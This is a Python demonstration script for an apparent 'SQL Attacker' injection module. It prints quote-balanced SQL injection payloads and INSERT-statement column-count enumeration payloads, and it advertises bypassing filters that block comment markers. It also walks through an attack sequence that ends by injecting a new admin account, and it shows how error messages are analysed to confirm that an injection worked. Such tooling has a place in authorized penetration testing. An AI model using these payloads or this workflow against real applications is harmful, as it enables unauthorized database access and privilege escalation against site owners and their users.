#!/usr/bin/env python3
"""
Demonstration script for quote balancing and INSERT statement injection features.

This script showcases the new enhancements to the SQL Attacker module.
"""

from sql_attacker.injection_contexts.sql_context import SQLInjectionModule


def demo_quote_balancing():
    """Demonstrate quote balancing payloads."""
    print("=" * 80)
    print("QUOTE BALANCING PAYLOADS DEMONSTRATION")
    print("=" * 80)
    print()
    
    module = SQLInjectionModule()
    
    print("Quote balancing avoids SQL comment syntax (-- or #) by balancing quotes.")
    print("This can bypass filters that block comment markers.\n")
    
    # Generate quote-balanced payloads
    payloads = module._generate_quote_balanced_payloads("username")
    
    print(f"Generated {len(payloads)} quote-balanced payloads:")
    print("-" * 80)
    
    for i, payload in enumerate(payloads[:10], 1):
        print(f"{i:2d}. {payload}")
    
    if len(payloads) > 10:
        print(f"    ... and {len(payloads) - 10} more")
    
    print()
    print("Example vulnerable query:")
    print("  SELECT * FROM users WHERE username = 'INPUT'")
    print()
    print("Traditional injection:")
    print("  Payload: admin' OR 1=1--")
    print("  Result:  SELECT * FROM users WHERE username = 'admin' OR 1=1--'")
    print()
    print("Quote-balanced injection:")
    print("  Payload: Wiley' OR 'a'='a")
    print("  Result:  SELECT * FROM users WHERE username = 'Wiley' OR 'a'='a'")
    print()


def demo_insert_enumeration():
    """Demonstrate INSERT statement parameter enumeration."""
    print("=" * 80)
    print("INSERT STATEMENT PARAMETER ENUMERATION DEMONSTRATION")
    print("=" * 80)
    print()
    
    module = SQLInjectionModule()
    
    print("INSERT injections require discovering the correct number of parameters.")
    print("This technique progressively adds parameters to find the right count.\n")
    
    # Generate INSERT payloads with limited parameters for demonstration
    payloads = module._generate_insert_payloads("testuser", max_params=5)
    
    print(f"Generated {len(payloads)} INSERT enumeration payloads:")
    print("-" * 80)
    
    # Show progressive parameter enumeration
    print("\nProgressive parameter enumeration (NULL values):")
    enum_payloads = [p for p in payloads if "NULL" in p and ")--" in p][:8]
    for i, payload in enumerate(enum_payloads, 1):
        param_count = payload.count("NULL")
        print(f"{i:2d}. {payload:40s}  # {param_count} parameter(s)")
    
    # Show numeric variants
    print("\nNumeric parameter variants:")
    num_payloads = [p for p in payloads if "', 1" in p and "NULL" not in p][:5]
    for i, payload in enumerate(num_payloads, 1):
        print(f"{i:2d}. {payload}")
    
    # Show mixed type examples
    print("\nMixed parameter type examples:")
    mixed_payloads = [p for p in payloads if ("'admin'" in p or "'test'" in p)][:4]
    for i, payload in enumerate(mixed_payloads, 1):
        print(f"{i:2d}. {payload}")
    
    print()
    print("Example vulnerable code:")
    print("  INSERT INTO users (username, email, role) VALUES ('INPUT', 'new@example.com', 'user')")
    print()
    print("Attack sequence:")
    print("  1. testuser')--          → Error: column count doesn't match")
    print("  2. testuser', NULL)--    → Error: column count doesn't match")
    print("  3. testuser', NULL, NULL)-- → Success! (or different error)")
    print("  4. admin', 'admin@evil.com', 'admin')-- → Admin user created!")
    print()


def demo_enhanced_detection():
    """Demonstrate enhanced response analysis."""
    print("=" * 80)
    print("ENHANCED RESPONSE ANALYSIS DEMONSTRATION")
    print("=" * 80)
    print()
    
    module = SQLInjectionModule()
    
    print("The framework now detects INSERT-specific errors and quote-balanced success.\n")
    
    # Test 1: INSERT error detection
    print("Test 1: INSERT parameter count error (MySQL)")
    print("-" * 80)
    response = "Error: Column count doesn't match value count at row 1"
    detected, anomalies = module.step2_detect_anomalies(response, {}, 0.5)
    
    print(f"Response: {response}")
    print(f"Detected: {detected}")
    print(f"Anomalies: {anomalies}")
    
    if detected:
        evidence = module.step3_extract_evidence(response, anomalies)
        print(f"Confidence: {evidence['confidence']:.2f}")
        if 'insert_detection' in evidence.get('context_info', {}):
            print(f"Statement Type: {evidence['context_info']['insert_detection']['statement_type']}")
    print()
    
    # Test 2: Oracle INSERT error
    print("Test 2: INSERT error (Oracle)")
    print("-" * 80)
    response = "ORA-00913: too many values"
    detected, anomalies = module.step2_detect_anomalies(response, {}, 0.5)
    
    print(f"Response: {response}")
    print(f"Detected: {detected}")
    print(f"Anomalies: {anomalies}")
    
    if detected:
        evidence = module.step3_extract_evidence(response, anomalies)
        print(f"Confidence: {evidence['confidence']:.2f}")
    print()
    
    # Test 3: Quote-balanced success
    print("Test 3: Quote-balanced injection success")
    print("-" * 80)
    response = "Record successfully inserted into database"
    detected, anomalies = module.step2_detect_anomalies(
        response, {}, 0.5, payload_hint="QUOTE_BALANCED"
    )
    
    print(f"Response: {response}")
    print(f"Detected: {detected}")
    if detected:
        print(f"Anomalies: {anomalies}")
        evidence = module.step3_extract_evidence(response, anomalies)
        print(f"Quote Balanced: {evidence['details'].get('quote_balanced', False)}")
    print()


def demo_integrated_workflow():
    """Demonstrate integrated workflow with new features."""
    print("=" * 80)
    print("INTEGRATED WORKFLOW DEMONSTRATION")
    print("=" * 80)
    print()
    
    module = SQLInjectionModule()
    
    print("Step 1: Generate payloads for INSERT statement")
    print("-" * 80)
    
    payloads = module.step1_supply_payloads(
        "usertest",
        statement_type="INSERT",
        max_insert_params=5
    )
    
    print(f"Total payloads generated: {len(payloads)}")
    
    # Count different types
    quote_balanced = sum(1 for p in payloads if "' OR '" in p and not p.endswith(('--', '#')))
    insert_enum = sum(1 for p in payloads if "')--" in p or "', NULL" in p or "', 1" in p)
    traditional = len(payloads) - quote_balanced - insert_enum
    
    print(f"  - Traditional payloads: {traditional}")
    print(f"  - Quote-balanced payloads: {quote_balanced}")
    print(f"  - INSERT enumeration payloads: {insert_enum}")
    print()
    
    print("Step 2 & 3: Analyze response and extract evidence")
    print("-" * 80)
    
    # Simulate an INSERT error response
    response = "MySQL Error: Column count doesn't match value count"
    detected, anomalies = module.step2_detect_anomalies(response, {}, 0.5)
    
    if detected:
        evidence = module.step3_extract_evidence(response, anomalies)
        
        print(f"Detection result: {detected}")
        print(f"Confidence score: {evidence['confidence']:.2f}")
        print(f"Database type: {evidence['context_info'].get('database_type', 'Unknown')}")
        
        if 'insert_detection' in evidence.get('context_info', {}):
            insert_info = evidence['context_info']['insert_detection']
            print(f"Statement type: {insert_info['statement_type']}")
            print(f"Detection method: INSERT parameter enumeration")
    print()


def main():
    """Run all demonstrations."""
    print()
    print("╔" + "═" * 78 + "╗")
    print("║" + " " * 78 + "║")
    print("║" + "  SQL Attacker: Quote Balancing & INSERT Injection Demo".center(78) + "║")
    print("║" + " " * 78 + "║")
    print("╚" + "═" * 78 + "╝")
    print()
    
    demo_quote_balancing()
    print()
    
    demo_insert_enumeration()
    print()
    
    demo_enhanced_detection()
    print()
    
    demo_integrated_workflow()
    print()
    
    print("=" * 80)
    print("SUMMARY")
    print("=" * 80)
    print()
    print("The SQL Attacker module has been enhanced with:")
    print()
    print("✓ Quote Balancing Payloads")
    print("  - Avoid SQL comment syntax (-- or #)")
    print("  - Bypass comment-blocking filters")
    print("  - Support single and double quote variants")
    print()
    print("✓ INSERT Parameter Enumeration")
    print("  - Progressive parameter discovery")
    print("  - Support for NULL, numeric, and string values")
    print("  - Mixed parameter type testing")
    print()
    print("✓ Enhanced Response Analysis")
    print("  - INSERT-specific error pattern detection")
    print("  - Quote-balanced success indicators")
    print("  - Improved confidence scoring")
    print("  - Database-specific error handling")
    print()
    print("For more information, see: sql_attacker/INJECTION_FRAMEWORK_GUIDE.md")
    print("=" * 80)
    print()


if __name__ == "__main__":
    main()
